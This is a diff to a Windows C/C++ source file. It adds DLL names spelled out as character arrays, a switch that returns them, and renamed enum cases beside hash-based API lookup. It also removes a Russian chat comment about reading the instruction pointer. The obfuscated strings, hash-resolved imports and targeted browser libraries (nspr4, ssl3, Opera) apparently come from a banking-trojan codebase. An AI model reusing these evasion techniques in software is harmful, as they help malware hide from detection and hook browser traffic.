@@ -10,13 +10,6 @@
 
 DWORD GetImageBase()
 {
-/*
-(28.12.2010 06:00:39) samuel_ro: Попробуй в асм блоке код:
-(28.12.2010 06:00:48) samuel_ro: db 0xe8
-(28.12.2010 06:00:56) samuel_ro: dd 0x00000000
-(28.12.2010 06:01:12) samuel_ro: pop eax //eax <- eip
-(28.12.2010 06:02:57) samuel_ro: код 0xe800000000 эквивалентен call +0, т.е. вызов команды следующей за call
-*/
 
 	DWORD dwRet = 0;
 
@@ -296,6 +289,70 @@ LPVOID GetApiAddr(HMODULE Module, DWORD ProcNameHash)
 }
 
 
+//---------------------------------------------------------------------
+//  GetDLLName -  Функция возвращает имя библиотеки
+//---------------------------------------------------------------------
+
+namespace DLLS
+{
+	const static char kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
+	const static char advapi32_dll[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
+	const static char user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
+	const static char ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
+	const static char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
+	const static char winsta_dll[]   = {'w','i','n','s','t','a','.','d','l','l',0};
+	const static char shell32_dll[]  = {'s','h','e','l','l','3','2','.','d','l','l',0};
+	const static char wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
+	const static char urlmon_dll[]   = {'u','r','l','m','o','n','.','d','l','l',0};
+	const static char nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
+	const static char ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
+	const static char winmm_dll[]	 = {'w','i','n','m','m','.','d','l','l',0};
+	const static char cabinet_dll[]  = {'c','a','b','i','n','e','t','.','d','l','l',0};
+	const static char opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};
+	const static char gdi32_dll[]    = {'G', 'd', 'i', '3', '2', '.', 'd', 'l', 'l',  0};
+	const static char gdiPlus_dll[]  = {'g','d','i','p','l','u','s','.','d','l','l', 0};
+	const static char crypt32_dll[]	 = {'c','r','y','p','t','3','2','.','d','l','l',0};
+	const static char Iphlpapi_dll[] = {'I','p','h','l','p','a','p','i','.','d','l','l',0};
+	const static char winspool_drv[] = {'w','i','n','s','p','o','o','l','.','d','r','v',0};
+	const static char odbc32_dll[]    = {'o','d','b','c','3','2','.','d','l','l',0};
+	const static char commdlg32_dll[] = {'c','o','m','d','l','g','3','2','.','d','l','l',0};
+	const static char psapi_dll[]	  = {'p','s','a','p','i','.','d','l','l',0};
+	const static char shlwapi_dll[]	  = {'s','h','l','w','a','p','i','.','d','l','l',0};
+}
+
+PCHAR GetDLLName(TDllId ID)
+{
+	#define Return(Name) return (PCHAR)DLLS::Name
+
+	switch (ID) {
+		case DLL_KERNEL32:   Return(kernel32_dll);
+		case DLL_ADVAPI32:   Return(advapi32_dll);
+		case DLL_USER32:     Return(user32_dll);
+		case DLL_WINSOCK:    Return(ws2_32_dll);
+		case DLL_NTDLL:      Return(ntdll_dll);
+		case DLL_WINSTA:     Return(winsta_dll);
+		case DLL_SHELL32:    Return(shell32_dll);
+		case DLL_WININET:    Return(wininet_dll);
+		case DLL_URLMON:     Return(urlmon_dll);
+		case DLL_NSPR4:      Return(nspr4_dll);
+		case DLL_SSL3:       Return(ssl3_dll);
+		case DLL_WINMM:      Return(winmm_dll);
+		case DLL_CABINET:    Return(cabinet_dll);
+		case DLL_OPERA:      Return(opera_dll);
+		case DLL_GDI:        Return(gdi32_dll);
+		case DLL_GDIPLUS:    Return(gdiPlus_dll);
+		case DLL_CRYPT32:    Return(crypt32_dll);
+		case DLL_PSAPI:      Return(psapi_dll);
+		case DLL_SHLWAPI:    Return(shlwapi_dll);
+		case DLL_IPHLPAPI:   Return(Iphlpapi_dll);
+		case DLL_WINSPOOL:   Return(winspool_drv);
+		case DLL_COMANDLG32: Return(commdlg32_dll);
+		case DLL_ODBC32:     Return(odbc32_dll);
+	}
+	return NULL;
+}
+
+
 LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 {
 
@@ -414,13 +471,13 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 			case DLL_IPHLPAPI:
 				DllName = (PCHAR)Iphlpapi_dll;break;
 
-			case WINSPOOL_DRV:
+			case DLL_WINSPOOL:
 				DllName = (PCHAR)winspool_drv;break;
 			
-			case COMANDLG32_DLL:
+			case DLL_COMANDLG32:
 				DllName = (PCHAR)commdlg32_dll;break;
 
-			case ODBC32_DLL:
+			case DLL_ODBC32:
 				DllName = (PCHAR)odbc32_dll;break;
 			default:
 				return 0;
